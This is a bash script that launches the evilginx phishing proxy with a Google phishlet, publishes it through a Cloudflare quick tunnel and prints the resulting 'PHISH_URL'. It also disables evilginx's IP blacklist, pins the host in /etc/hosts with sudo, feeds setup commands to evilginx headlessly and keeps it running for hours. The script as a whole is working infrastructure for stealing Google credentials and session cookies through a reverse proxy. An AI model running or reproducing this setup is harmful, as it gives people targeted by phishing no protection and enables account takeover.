#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true

echo "--- phase 1: get tunnel url ---"
nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL" || { echo "NO_TUNNEL_URL_FOUND"; tail -n 30 cloudflared.log; }
HOST="${URL#https://}"

echo "--- phase 2: hosts pin + tunnel with correct SNI ---"
$SUDO sh -c "echo '127.0.0.1 $HOST' >> /etc/hosts"
pkill -f cloudflared 2>/dev/null || true
sleep 2
nohup "$CLOUDFLARED" tunnel --url "https://$HOST:443" --no-tls-verify > cloudflared.log 2>&1 &
sleep 3

echo "--- generate self-signed cert for $HOST ---"
openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/egkey.pem -out /tmp/egcert.pem -days 1 -subj "/CN=$HOST" 2>/dev/null

echo "--- writing evilginx config (enable google) ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$URL\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null

echo "--- starting evilginx (headless via fifo) ---"
rm -f /tmp/eg_in; mkfifo /tmp/eg_in
( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets enable google"; sleep 1; echo "cert /tmp/egcert.pem /tmp/egkey.pem"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &

echo "--- waiting for :443 (up to 60s) ---"
BOUND=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; BOUND=1; break; fi
  sleep 2
done
echo "PORT443_BOUND=$BOUND"

echo "=== streaming evilginx output ==="
trap 'kill %4 %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
